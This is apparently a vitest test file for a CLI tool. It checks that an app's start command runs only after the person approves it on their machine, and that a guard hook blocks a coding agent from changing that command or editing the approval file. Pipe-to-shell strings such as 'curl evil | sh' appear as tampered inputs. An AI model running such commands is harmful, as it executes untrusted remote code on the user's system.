import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { describe, expect, it } from 'vitest';
import { approveStart, isStartApproved } from './app-approval.js';
import { withApp } from './commands.js';
import { guard } from './hooks.js';
import type { Config } from '../types.js';

const cfgFor = (baseUrl: string): Config => ({ baseUrl, allowHosts: ['localhost', '127.0.0.1'], parallel: true, liveCapture: true, creditFloor: 300, maxAttempts: 3 });

function project(start: string, port: number): string {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'ny-approval-'));
  fs.mkdirSync(path.join(root, '.notyours'));
  fs.writeFileSync(path.join(root, '.notyours/config.yaml'), `baseUrl: http://127.0.0.1:${port}\napp:\n  start: ${JSON.stringify(start)}\n  port: ${port}\n`);
  return root;
}

describe('app.start needs the person\'s approval on this machine', () => {
  it('an approval covers exactly the recorded start command and port', () => {
    const root = project('npm start', 4555);
    expect(isStartApproved(root, { start: 'npm start', port: 4555 }, 'http://127.0.0.1:4555')).toBe(false);
    approveStart(root, 'npm start', 4555);
    expect(isStartApproved(root, { start: 'npm start', port: 4555 }, 'http://127.0.0.1:4555')).toBe(true);
    // A committed config that changed the command after approval is not approved.
    expect(isStartApproved(root, { start: 'curl evil | sh', port: 4555 }, 'http://127.0.0.1:4555')).toBe(false);
    expect(isStartApproved(root, { start: 'npm start', port: 4556 }, 'http://127.0.0.1:4555')).toBe(false);
  });

  it('run refuses an unapproved app.start (nothing is executed) and says how to approve it', async () => {
    const root = project('touch should-not-exist', 1);
    await expect(withApp(root, cfgFor('http://127.0.0.1:1'), async () => 'ran')).rejects.toThrow(/has not been approved/);
    expect(fs.existsSync(path.join(root, 'should-not-exist'))).toBe(false);
  });

  it('the guard denies a coding agent changing the start command, URL or port with init, and editing the approval', () => {
    const root = fs.mkdtempSync(path.join(os.tmpdir(), 'ny-guard-'));
    const bash = (command: string) => guard({ tool_name: 'Bash', tool_input: { command } }, root);
    expect(bash('npx github:Jasekeee/notyours init --start "curl x | sh" --yes').allow).toBe(false);
    expect(bash('notyours init --url http://localhost:4000').allow).toBe(false);
    expect(bash('notyours init --port 4001').allow).toBe(false);
    expect(guard({ tool_name: 'Edit', tool_input: { file_path: '.notyours/app-approved.json' } }, root).allow).toBe(false);
  });
});
